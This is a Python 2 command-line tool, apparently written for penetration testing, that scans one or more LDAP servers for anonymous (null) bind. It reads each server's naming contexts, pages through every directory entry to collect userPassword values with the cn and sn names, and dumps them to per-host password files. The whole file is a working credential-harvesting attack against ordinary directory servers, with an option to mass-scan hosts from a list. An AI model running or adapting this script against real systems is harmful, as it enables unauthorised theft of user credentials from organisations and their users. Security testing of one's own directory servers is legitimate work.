import ldap
import ldap.filter
import argparse
import sys
from ldap.controls import SimplePagedResultsControl
import time


''' this class will help us test the ldap '''
class LDAPTester:
    PASSWORD_KEY = "userPassword"
    CN_KEY = "cn"
    SN_KEY = "sn"
    PAGE_SIZE = 1000
    
    def __init__(self, hostname, out, port, timeout=3):
        self.hostname = hostname
        self.port = port
        self.out = out
        self.timeout = timeout
        
    ''' 
    test the null bind 
    some server don't reply negatively to the null bind, but report an insufficient access error when a research is performed
    '''
    def null_bind(self):
        try:
            print "\n[*] testing host %s" % self.hostname
            self.l = ldap.initialize("ldap://{}:389".format(self.hostname))
            self.l.set_option(ldap.OPT_NETWORK_TIMEOUT,self.timeout)
            self.l.set_option(ldap.OPT_TIMEOUT,self.timeout)

            self.l.simple_bind_s("","")
            print "[*] seems like null bind is allowed, let's make a search to catch INSUFFICIENT_ACCESS error."

            self.l.search_s("", ldap.SCOPE_SUBTREE)
            print("[*] null bind allowed for host {}".format(self.hostname))

            return True
        # in this case we successfully bind but the search got no result
        except ldap.NO_SUCH_OBJECT as e:
            print("[*] null bind allowed for host {}".format(self.hostname))
            return True
        except ldap.OPERATIONS_ERROR:
            return False
        except ldap.INSUFFICIENT_ACCESS:
            return False
        except ldap.TIMEOUT:
            return False
        except ldap.SERVER_DOWN:
            return False

    ''' 
    get the naming context from the LDAP this will allow us to get the baseDN in order to perform searches 
    '''
    def get_naming_contexts(self):
        try:
            res = self.l.search_s("", ldap.SCOPE_BASE, attrlist=["+"])
            self.naming_contexts = res[0][1]["namingContexts"]
            if len(self.naming_contexts) > 0:
                print("[*] found naming contexts {}".format(self.naming_contexts))
                return True
            return False
        except Exception as e:
            print("[-] can't get naming context ({}){} ".format(type(e), e))
            return False

    ''' 
    let's find passwords for all the objects for each namingcontext.
    This function use paginated search because those request can return looooooots of entries
    '''
    def find_passwords(self):
        self.passwords = []
        known_ldap_resp_ctrls = {
            SimplePagedResultsControl.controlType:SimplePagedResultsControl,
        }
        
        for naming_ctx in self.naming_contexts:
            try:
                lc = SimplePagedResultsControl(True, size=LDAPTester.PAGE_SIZE, cookie='')
                print("[*] looking for passwords in context {}".format(naming_ctx))
                msgid = self.l.search_ext(naming_ctx, ldap.SCOPE_SUBTREE, attrlist=["*"], serverctrls=[lc])
                
                pages = 0
                while True:
                    pages += 1
                    print("[*] Getting page {}\r".format(pages))
                    sys.stdout.write("\033[F") 
                    rtype, rdata, rmsgid, serverctrls = self.l.result3(msgid, resp_ctrl_classes=known_ldap_resp_ctrls)

                    for entity in rdata:
                        entry = [entity[0]]
                        if LDAPTester.PASSWORD_KEY in entity[1].keys():
                            entry.append(entity[1][LDAPTester.PASSWORD_KEY][0])
                            
                            if LDAPTester.CN_KEY in entity[1].keys():
                                entry.append(entity[1][LDAPTester.CN_KEY][0])
                            else:
                                entry.append("")

                            if LDAPTester.SN_KEY in entity[1].keys():
                                entry.append(entity[1][LDAPTester.SN_KEY][0])
                            else:
                                entry.append("")
                        
                            self.passwords.append(entry)

                    pctrls = [c for c in serverctrls if c.controlType == SimplePagedResultsControl.controlType]
                    if pctrls:
                        if pctrls[0].cookie:
                            lc.cookie = pctrls[0].cookie
                            msgid = self.l.search_ext(naming_ctx, ldap.SCOPE_SUBTREE, attrlist=["*"], serverctrls=[lc])
                        else:
                            break
                    else:
                        print("\n[-] Warning:  Server ignores RFC 2696 control.")
                        break
                    
            except ldap.LDAPError as e:
                print('\n[-] Could not pull LDAP results: {}'.format(e))
            except Exception as e:
                print("\n[-] got exception while finding passwords ({}){} ".format(type(e), e))
        
    '''
    this function dump the passwords into a file in the format userCN:password
    '''
    def dump_passwords(self):
        filename = "{}/{}.passwords.lst".format(self.out, self.hostname)
        print("\n[*] dumping passwords into {}".format(filename))
        out = open(filename, 'w')
        for passwd in self.passwords:
            out.write("{}:{}:{}\n".format(passwd[0], passwd[1], passwd[2]))
        out.close()


def get_args():
    # Make parser object
    p = argparse.ArgumentParser(description=
        """
        Test an LDAP server for null bind, base dn, and dump the content.
        """,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    
    p.add_argument("out", type=str, help="output directory, will be created if doesn't exist")
    p.add_argument("--host", help="host to scan")
    p.add_argument("--port", type=int, default=389, help="which port the ldap server is listenning on (default to 389)")
    p.add_argument("--host-file", type=str, help="provide a file containing list of host in the form host:port") 
    return(p.parse_args())


def main():
    args = get_args()
    if args.host_file:
        targets = []
        for i in open(args.host_file,'r').read().split("\n"):
            targets.append(i.split(':'))
    else:
        targets = [[args.host, args.port]]
    result = open("{}/out.lst".format(args.out),"w")
    for t in targets:
        ldapTester = LDAPTester(t[0], args.out, t[1])

        if ldapTester.null_bind():
            if not ldapTester.get_naming_contexts():
                continue
            ldapTester.find_passwords()
            ldapTester.dump_passwords()
            result.write(t[0] + '\n')
    result.close()


if __name__ == "__main__":
    main()
